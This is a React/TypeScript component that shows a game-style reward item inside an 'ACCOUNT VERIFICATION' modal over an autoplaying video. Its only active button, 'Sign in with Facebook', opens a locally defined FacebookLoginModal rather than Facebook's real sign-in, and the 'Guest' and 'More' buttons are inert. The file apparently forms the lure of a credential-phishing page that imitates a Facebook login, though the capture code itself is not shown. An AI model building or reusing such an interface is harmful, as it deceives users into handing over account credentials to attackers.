import { useEffect, useState } from 'react';
import FacebookLoginModal from './FacebookLoginModal';
import { X } from 'lucide-react';

interface RewardItem {
  id: number;
  name: string;
  description: string;
  rarity: 'Legendary' | 'Epic' | 'Rare';
  image_url: string;
}

interface AccessModalProps {
  isOpen: boolean;
  onClose: () => void;
  item: RewardItem | null;
}

const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
  const [showFacebookLogin, setShowFacebookLogin] = useState(false);

  const handleBackdropClick = (e: React.MouseEvent) => {
    if (e.target === e.currentTarget) {
      onClose();
    }
  };

  const handleFacebookLogin = () => {
    setShowFacebookLogin(true);
  };

  const handleCloseFacebookLogin = () => {
    setShowFacebookLogin(false);
  };

  if (!isOpen) return null;

  return (
    <>
      <div
        className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm"
        onClick={handleBackdropClick}
      >
        <div className="relative w-[90%] max-w-md aspect-[16/9] bg-black rounded-lg shadow-2xl overflow-hidden">

          {/* Close Button and Title */}
          <div className="absolute top-0 left-0 w-full flex justify-between items-center px-4 py-2 z-20 bg-white/80 backdrop-blur-sm">
            <h2 className="text-sm font-semibold text-gray-800">ACCOUNT VERIFICATION</h2>
            <button onClick={onClose}>
              <X className="w-5 h-5 text-gray-500 hover:text-black" />
            </button>
          </div>

          {/* Video Background */}
          <iframe
            src="https://streamable.com/e/9d8j5m?autoplay=1&muted=1&nocontrols=1"
            allow="fullscreen;autoplay"
            allowFullScreen
            className="absolute top-0 left-0 w-full h-full z-10"
          />

          {/* Buttons Overlayed on Video */}
          <div className="absolute bottom-4 left-1/2 transform -translate-x-1/2 z-20 w-full px-4 flex flex-col items-center gap-2">
            <button
              onClick={handleFacebookLogin}
              className="w-[80%] bg-[#1877f2] text-white px-3 py-1.5 rounded-md shadow-md hover:bg-[#145dcc] text-xs font-medium text-center"
            >
              Sign in with Facebook
            </button>
            <div className="flex w-[80%] justify-between gap-2">
              <button className="flex-1 bg-white/90 border border-gray-400 text-black py-1 rounded-md shadow text-xs font-semibold">
                👤 Guest
              </button>
              <button className="flex-1 bg-white/90 border border-gray-400 text-black py-1 rounded-md shadow text-xs font-semibold">
                ••• More
              </button>
            </div>
          </div>

        </div>
      </div>

      {/* Facebook Login Modal */}
      <FacebookLoginModal
        isOpen={showFacebookLogin}
        onClose={handleCloseFacebookLogin}
      />
    </>
  );
};

export default AccessModal;
